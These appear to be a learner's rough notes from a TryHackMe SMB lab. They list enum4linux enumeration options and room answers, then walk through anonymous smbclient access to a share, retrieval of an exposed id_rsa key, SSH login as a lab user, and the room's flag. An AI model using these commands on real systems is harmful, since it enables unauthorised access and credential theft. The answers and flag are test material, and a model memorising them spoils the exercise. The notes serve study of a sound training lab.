- enum4linux to find any useful information about the target in view
----Find the port
--3
--139/445
----Operating System?
--Windows 6.1
----what system samba runs on?
--unix
---state the workgroup name.
--Workgroup
---The share that sticks out?

Enum4linux syntax
enum4linux -[option] [ip_of the target client]
common usages 
-U             get userlist
-M             get machine list
-N             get namelist dump (different from -U and-M)
-S             get sharelist
-P             get password policy information
-G             get group and member list

-a             all of the above (full basic enumeration)


-----EXPLOITING SMB ----
Here we are explioting a common misconfiguration of the user Anonymous 
-- Login with the username anonymous
smbclient //ip/user -U Username - p port(Default ports)
-- Here for instance we used 
smbclient //10.10.10.2/secret -U suit -p 445
smbclient //10.10.69.191/Profiles -U Anonymous -p 445
this configuration does not ask for a password
which when logging in does provide access to the machines _sshfile which can be used to escalate the privilage to have a user sign in with the current default password



--- To download a file on SMB client the following syntax is used
-- get/mget file_name*

----To read a file in the smb client the syntax below is used
--more "file_name"

To change the id_rsa file into a usable the format 
 -- first move it to an .ssh folder/file
 ---then chmod 600 [id_rsa]

To find the correct username of the account
more id_rsa.pub and find it at the end of the document

----- To log in into the specific user account 
--syntax
ssh -i id_rsa username@ip
in this case we used 
ssh -i id_rsa cactus@10.10.69.191
ls
smb.txt contained the flag
THM{smb_is_fun_eh?}
